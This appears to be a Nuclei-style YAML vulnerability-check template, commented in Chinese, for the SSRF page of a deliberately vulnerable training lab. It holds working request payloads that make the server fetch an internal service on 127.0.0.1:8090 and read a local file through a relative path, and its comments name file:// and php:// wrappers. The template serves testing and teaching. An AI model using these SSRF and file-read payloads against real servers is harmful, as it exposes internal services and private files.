id: vulnlab-ssrf-internal-access

info:
  name: SSRF（服务端可被诱导访问内网服务）
  severity: critical
  author: hediwen
  tags: [ssrf, injection, internal-network]
  description: |
    请求参数被直接用作服务端请求的目标地址，未做协议与地址校验。

    检测思路：让服务端去请求一个「只应该被内网访问」的服务
    （靶场的 8090 端口，模拟内网服务），看响应里是否回显了那个服务的内容。

    为什么用「内网服务的独特内容」而不是简单的状态码：
    HTTP 200 不能说明任何事 —— 目标可能返回一个通用页面。
    只有当响应里出现了**只有那个内网服务才会有的内容**，
    才能确认请求真的打到了那里。

    前置条件：靶场需要同时启动 8080（主靶场）和 8090（内网服务），
    `start.sh` / `start.bat` 会自动做这件事。
    只启 8080 的话本 PoC 不会命中 —— 那是环境问题，不是漏洞不存在。
  reference:
    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/

requests:
  # ── ① 诱导服务端访问内网服务 ────────────────────────────────────
  #
  # url 参数完整编码，避免中间的 :// 被 HTTP 层或日志处理时截断。
  #
  # 判据用内网服务响应里的凭证串 —— 它只可能来自
  # 「服务端真的替我们请求了那个地址」。
  #
  # ⚠️ 这里踩过一个判据坑：早先还有一条 matcher 写的是
  #    `"service": "internal-admin-api"`（引号未转义），于是**永远匹配不上** ——
  #    因为靶场页面是用 htmlspecialchars() 渲染取回的正文的，
  #    引号在 HTML 里是 `&quot;`。
  #    下面改成容错正则：转义与否都能命中。
  - method: GET
    path:
      - "{{BaseURL}}/ssrf/low.php?url=http%3A%2F%2F127.0.0.1%3A8090%2Finternal%2Finner-service.php"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "VULNLAB{ssrf_reached_internal_service}"

      # 交叉验证：内网服务的响应里确实带着这个字段
      # （`"` 与 `&quot;` 两种形态都接受）
      - type: regex
        part: body
        regex:
          - "(&quot;|\")service(&quot;|\")\\s*:\\s*(&quot;|\")internal-admin-api(&quot;|\")"

    extractors:
      - type: regex
        part: body
        name: leaked_secret
        regex:
          - "(VULNLAB\\{ssrf_reached_internal_service\\})"

  # ── ② 不限制协议 → 退化成任意文件读取 ────────────────────────────
  #
  # low 档「协议不限」意味着 `file://` / `php://` 这类包装器照样能用，
  # 于是 SSRF 在这里同时也是一个文件读取漏洞。
  #
  # ⚠️ 用相对路径读靶场自带的演示文件，而不是 `file:///C:/Windows/win.ini`：
  #    绝对路径绑定系统与安装位置，换台机器就失效。
  #    实测 `file:///C:/Windows/win.ini` 在本机就读不出预期内容
  #    （win.ini 存在，但没有判据要找的那行），整条请求永远 0 命中。
  #    相对路径的好处是：它同时利用了「不限制协议」——
  #    `file_get_contents()` 拿到没有 scheme 的字符串就按本地路径处理。
  - method: GET
    path:
      - "{{BaseURL}}/ssrf/low.php?url=..%2Flfi_probe.txt"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "VULNLAB_LFI_PROBE_MARKER"

      # 负向判据只认「请求失败」——
      # 「无法解析」不能当失败证据：页面在代码回显区里会打印
      # `协议: (无法解析) / 主机: (无法解析)`，**每次请求都会出现**。
      - type: word
        part: body
        words: ["请求失败"]
        condition: or
        negative: true

    extractors:
      - type: regex
        part: body
        name: leaked_file
        regex:
          - "(VULNLAB_LFI_PROBE_MARKER)"
